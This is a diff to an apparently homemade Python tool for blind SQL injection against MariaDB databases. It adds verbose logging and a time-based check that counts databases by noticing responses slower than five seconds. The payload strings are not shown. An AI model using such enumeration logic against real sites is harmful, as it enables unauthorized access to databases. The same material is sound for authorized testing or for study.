@@ -49,7 +49,6 @@ class HTTPUrlEncode():
     def __init__(self, url, data=None):
         # Named tuple of url split into parts.
         self.url = urllib.parse.urlparse(url)
-        print(self.url)
         self.data = data
 
     def encode(self):
@@ -82,7 +81,6 @@ class HTTPTimedRequest(HTTPrequest):
 
     def send_request(self):
         """ return the time taken for the request """
-        print('Sending timed request ...')
         self.start = time.time()
         self.response = super().send_request()
         self.finish = time.time()
@@ -118,10 +116,13 @@ class MariaDBdatabase():
         # database query
         self.query = config.MariaDB.DATABASE_NUM.value
         self.url = self.url + self.query
+        if(VERBOSE): print('Searching number of databases ...')
         for i in range(0, self.MAX_RANGE + 1):
             if(self.attack == "TIME"):
                 self.time = HTTPTimedRequest(self.url.format(i), self.header, self.data).send_request()
-                print(self.time)
+                if(self.time > 5):
+                    self.database_num = i
+                    if(VERBOSE): print('\033[32m' + '[+] Number of databases found: {}'.format(i))
             elif(self.attack == "ERROR"):
                 pass
             elif(self.attack == "BOOLEAN"):
@@ -144,11 +145,13 @@ class MariaDBrows():
 
 class MariaDB():
     """ Main database object for controlling enumeration of mariaDB databases. """
-    def __init__(self,url,header,data=None,time=False,error=False,boolean=False,verbose=False):
+    def __init__(self,url,header,data=None,time=False,error=False,boolean=False):
         self.url = url
         self.header = header
         self.data = data
         self.attack = self._attack(time, error, boolean)
+
+
     def _attack(self, time, error, boolean):
         """ Define type of attack """
         if(time):
@@ -161,6 +164,7 @@ class MariaDB():
             print("Unsupported attack type")
 
     def attack_database(self):
+        if(VERBOSE): print('mariaDB database {} attack initiated ...'.format(self.attack))
         database_names = MariaDBdatabase(self.url,self.header,self.attack, self.data).search_database_names()
 
 ###### Main object builder ######
@@ -197,7 +201,9 @@ def main():
     if(args.maria):
         class_name = Factory("-mDB").get_class_name()
 
-    database_object = class_name(args.url, args.header, args.data, args.time, args.error, args.boolean, args.verbose)
+    global VERBOSE
+    VERBOSE = args.verbose
+    database_object = class_name(args.url, args.header, args.data, args.time, args.error, args.boolean)
     database_object.attack_database()
 
 if __name__ == "__main__":
